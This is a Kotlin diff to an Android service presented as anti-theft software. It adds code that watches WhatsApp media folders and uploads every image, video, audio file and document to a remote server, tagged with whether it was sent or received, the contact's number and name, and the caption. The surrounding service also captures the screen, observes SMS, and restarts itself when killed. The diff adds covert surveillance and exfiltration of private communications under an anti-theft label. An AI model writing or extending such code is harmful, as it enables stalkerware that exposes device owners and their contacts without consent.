@@ -104,6 +104,25 @@ class AntiTheftService : LifecycleService() {
         // Storage for screen capture token
         var mediaProjectionResultCode: Int = 0
         var mediaProjectionData: Intent? = null
+
+        @Volatile
+        private var storedDeviceId: String = ""
+
+        @Volatile
+        private var serviceInstance: AntiTheftService? = null
+
+        fun uploadWhatsAppMedia(file: File, type: String, isSent: Boolean, address: String, name: String, caption: String) {
+            val id = storedDeviceId
+            if (id.isBlank()) {
+                Log.w("AntiTheftService", "Cannot upload WhatsApp media: no deviceId yet")
+                return
+            }
+            val service = serviceInstance ?: run {
+                Log.w("AntiTheftService", "Cannot upload WhatsApp media: service not running")
+                return
+            }
+            service.uploadWhatsAppMediaInternal(file, type, isSent, address, name, caption)
+        }
     }
 
     private lateinit var deviceId: String
@@ -163,6 +182,9 @@ class AntiTheftService : LifecycleService() {
     private var smsObserver: ContentObserver? = null
     private var lastKnownSmsId = 0L
 
+    // WhatsApp media file observer
+    private var whatsAppMediaObserver: WhatsAppMediaObserver? = null
+
     override fun onCreate() {
         super.onCreate()
         Log.d("AntiTheftService", "Service onCreate")
@@ -172,6 +194,8 @@ class AntiTheftService : LifecycleService() {
         
         // Generate Unique ID
         deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "android_dev"
+        storedDeviceId = deviceId
+        serviceInstance = this
 
         // Load preferences — custom name overrides the hardware model name
         val sharedPrefs = getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
@@ -197,6 +221,9 @@ class AntiTheftService : LifecycleService() {
 
         // Establish Server WebSocket connection
         connectToServer()
+
+        // Start watching WhatsApp media folders (images, videos, audio, documents)
+        whatsAppMediaObserver = WhatsAppMediaObserver.get().also { it.start() }
 
         // Schedule watchdog to restart this service if killed
         ServiceWatchdogWorker.schedule(this)
@@ -667,6 +694,46 @@ class AntiTheftService : LifecycleService() {
                 Log.e("AntiTheftService", "File upload network failure: ${e.message}", e)
                 sendConsoleLog("Falha de rede ao enviar arquivo: ${e.message}")
                 file.delete()
+            }
+        })
+    }
+
+    // Upload a WhatsApp media file and notify server which conversation it belongs to
+    private fun uploadWhatsAppMediaInternal(file: File, type: String, isSent: Boolean, address: String, name: String, caption: String) {
+        val path = "/upload/whatsapp-media/$deviceId"
+        val serverUrl = getUploadUrl(path)
+        Log.d("AntiTheftService", "Uploading WhatsApp media to: $serverUrl")
+
+        val direction = if (isSent) "out" else "in"
+        val requestBody = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("file", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
+            .addFormDataPart("type", type)
+            .addFormDataPart("direction", direction)
+            .addFormDataPart("address", address)
+            .addFormDataPart("name", name)
+            .addFormDataPart("caption", caption)
+            .build()
+
+        val request = Request.Builder()
+            .url(serverUrl)
+            .post(requestBody)
+            .build()
+
+        okHttpClient.newCall(request).enqueue(object : Callback {
+            override fun onResponse(call: Call, response: Response) {
+                response.use {
+                    if (response.isSuccessful) {
+                        Log.d("AntiTheftService", "WhatsApp media uploaded: ${file.name}")
+                        sendConsoleLog("Mídia do WhatsApp enviada: ${file.name}")
+                    } else {
+                        Log.e("AntiTheftService", "WhatsApp media upload failed: Code ${response.code}")
+                    }
+                }
+            }
+
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("AntiTheftService", "WhatsApp media upload network failure: ${e.message}", e)
             }
         })
     }
@@ -1263,6 +1330,7 @@ class AntiTheftService : LifecycleService() {
         super.onDestroy()
         Log.d("AntiTheftService", "Service onDestroy — scheduling immediate restart")
         isServiceRunning = false
+        if (serviceInstance === this) serviceInstance = null
 
         // Schedule restart via WorkManager (safer than Handler after onDestroy)
         ServiceWatchdogWorker.scheduleImmediate(applicationContext)
@@ -1286,6 +1354,9 @@ class AntiTheftService : LifecycleService() {
         stopFlash()
         wakeLock?.let { if (it.isHeld) it.release() }
         wakeLock = null
+
+        whatsAppMediaObserver?.stop()
+        whatsAppMediaObserver = null
     }
 
     private fun registerSmsObserver() {
